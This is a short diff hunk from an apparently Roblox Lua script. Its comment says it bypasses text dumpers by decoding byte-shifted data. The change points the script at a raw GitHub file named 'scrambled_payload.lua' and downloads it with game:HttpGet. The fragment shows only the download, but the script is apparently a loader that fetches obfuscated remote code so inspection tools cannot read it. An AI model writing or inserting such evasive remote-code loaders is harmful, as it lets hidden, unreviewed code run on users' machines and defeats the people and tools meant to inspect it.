@@ -3,7 +3,7 @@
     Bypasses text dumpers by decoding mathematical byte shifts.
 --]]
 
-local targetUrl = "https://githubusercontent.com"
+local targetUrl = "https://raw.githubusercontent.com/ItzYumi/Games/refs/heads/main/scrambled_payload.lua"
 
 -- Download the unreadable text from GitHub
 local networkData = game:HttpGet(targetUrl, true)
